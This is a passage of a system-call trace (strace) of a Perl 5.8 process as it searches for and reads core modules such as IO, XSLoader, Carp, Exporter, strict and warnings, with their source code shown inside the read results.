11808 20:20:26.772327 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4ecf8) = -1 EBADF (Bad file descriptor)
11808 20:20:26.772338 _llseek(1, 0, 0xbfd4ed40, SEEK_CUR) = -1 EBADF (Bad file descriptor)
11808 20:20:26.772348 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4ecf8) = -1 EINVAL (Invalid argument)
11808 20:20:26.772359 _llseek(2, 0, 0xbfd4ed40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
11808 20:20:26.772369 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
11808 20:20:26.772381 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4edb8) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:26.772391 _llseek(1, 0, [0], SEEK_CUR) = 0
11808 20:20:26.772402 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
11808 20:20:26.772414 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
11808 20:20:26.772432 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
11808 20:20:26.772485 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
11808 20:20:26.772530 getppid()         = 11806
11808 20:20:26.772590 stat64("/etc/perl/IO.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.772604 stat64("/etc/perl/IO.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:26.772616 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.772628 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:26.772642 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.772654 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:26.772667 stat64("/usr/lib/perl5/IO.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.772678 stat64("/usr/lib/perl5/IO.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:26.772702 stat64("/usr/share/perl5/IO.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.772716 stat64("/usr/share/perl5/IO.pm", 0xbfd4e9bc) = -1 ENOENT (No such file or directory)
11808 20:20:26.772752 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfd4eaac) = -1 ENOENT (No such file or directory)
11808 20:20:26.772765 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
11808 20:20:26.772799 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
11808 20:20:26.772813 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e7c8) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:26.772824 _llseek(6, 0, [0], SEEK_CUR) = 0
11808 20:20:26.772848 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
11808 20:20:26.772903 stat64("/etc/perl/XSLoader.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.772916 stat64("/etc/perl/XSLoader.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.772929 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.772946 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.772960 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.772973 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.772986 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.772998 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.773011 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.773023 stat64("/usr/share/perl5/XSLoader.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.773036 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.773048 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
11808 20:20:26.773068 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:26.773081 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:26.773092 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:26.773112 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
11808 20:20:26.773398 brk(0x8195000)    = 0x8195000
11808 20:20:26.773712 _llseek(8, 3407, [3407], SEEK_SET) = 0
11808 20:20:26.773775 _llseek(8, 0, [3407], SEEK_CUR) = 0
11808 20:20:26.773820 close(8)          = 0
11808 20:20:26.773914 stat64("/etc/perl/Carp.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.773929 stat64("/etc/perl/Carp.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.773943 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.773955 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.773969 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.773981 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.773994 stat64("/usr/lib/perl5/Carp.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.774006 stat64("/usr/lib/perl5/Carp.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.774019 stat64("/usr/share/perl5/Carp.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.774030 stat64("/usr/share/perl5/Carp.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.774043 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.774055 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.774069 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.774081 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
11808 20:20:26.774102 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:26.774116 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:26.774127 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:26.774144 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
11808 20:20:26.774620 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
11808 20:20:26.774648 read(8, "", 4096) = 0
11808 20:20:26.774659 close(8)          = 0
11808 20:20:26.774691 stat64("/etc/perl/Exporter.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.774707 stat64("/etc/perl/Exporter.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.774762 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.774775 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.774789 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.774801 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.774815 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.774841 stat64("/usr/lib/perl5/Exporter.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.774858 stat64("/usr/share/perl5/Exporter.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.774870 stat64("/usr/share/perl5/Exporter.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.774883 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.774895 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.774909 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.774921 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
11808 20:20:26.774942 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:26.774956 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:26.774968 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:26.774984 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
11808 20:20:26.775484 _llseek(8, 2217, [2217], SEEK_SET) = 0
11808 20:20:26.775501 _llseek(8, 0, [2217], SEEK_CUR) = 0
11808 20:20:26.775512 close(8)          = 0
11808 20:20:26.775583 stat64("/etc/perl/strict.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.775599 stat64("/etc/perl/strict.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.775613 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.775626 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.775639 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.775655 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.775669 stat64("/usr/lib/perl5/strict.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.775695 stat64("/usr/lib/perl5/strict.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.775734 stat64("/usr/share/perl5/strict.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.775746 stat64("/usr/share/perl5/strict.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.775776 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.775788 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.775801 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.775813 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
11808 20:20:26.775834 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:26.775848 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:26.775860 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:26.775879 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
11808 20:20:26.776021 _llseek(8, 598, [598], SEEK_SET) = 0
11808 20:20:26.776035 _llseek(8, 0, [598], SEEK_CUR) = 0
11808 20:20:26.776044 close(8)          = 0
11808 20:20:26.776081 stat64("/etc/perl/warnings.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.776096 stat64("/etc/perl/warnings.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.776109 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.776122 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.776135 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.776148 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.776162 stat64("/usr/lib/perl5/warnings.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.776189 stat64("/usr/lib/perl5/warnings.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.776246 stat64("/usr/share/perl5/warnings.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.776258 stat64("/usr/share/perl5/warnings.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.776305 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.776317 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfd4e50c) = -1 ENOENT (No such file or directory)
11808 20:20:26.776330 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfd4e5fc) = -1 ENOENT (No such file or directory)
11808 20:20:26.776342 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
11808 20:20:26.776363 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
11808 20:20:26.776377 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd4e318) = -1 ENOTTY (Inappropriate ioctl for device)
11808 20:20:26.776388 _llseek(8, 0, [0], SEEK_CUR) = 0
11808 20:20:26.776410 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> 